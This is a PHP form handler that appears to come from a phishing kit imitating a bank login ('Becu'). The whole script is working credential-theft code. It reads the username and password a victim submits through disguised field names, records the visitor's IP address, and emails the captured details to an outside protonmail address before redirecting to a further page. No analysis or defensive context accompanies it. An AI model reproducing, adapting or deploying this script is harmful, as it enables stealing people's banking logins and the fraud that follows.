<?php 
if(isset($_POST['deepwell'])){

	// collect ip address 
    $to = "angryberds@protonmail.ch"; // this is your Email address
    $from = 'talkorshoot@beckibitch.com'; 
	

    $denzelwashington = $_POST['denzelwashington'];
    $arthuemerlin = $_POST['arthuemerlin'];
	$ip = getenv("REMOTE_ADDR");

		
    $subject = "Becu Snith $ip";
    $message = "\n\n Username or email or mobile: " .  $denzelwashington . "\n\n Password:" .  $arthuemerlin . "\n\n IP:" .  $ip ;

    $headers = "From:" . $from;
    
     mail($to,$subject,$message,$headers);
	 
	

	if (!headers_sent()) {
	// No header sent , so you can use PHP to redirect //

	header("HTTP/1.1 301 Moved Permanently");
	header ("Location: movineen.php");
	exit;

	}else{

	// Header already sent, so use JavaScript to redirect //
	print "<script>";
	print " self.location='movineen.php';";
	print "</script>";
	}
    }
?>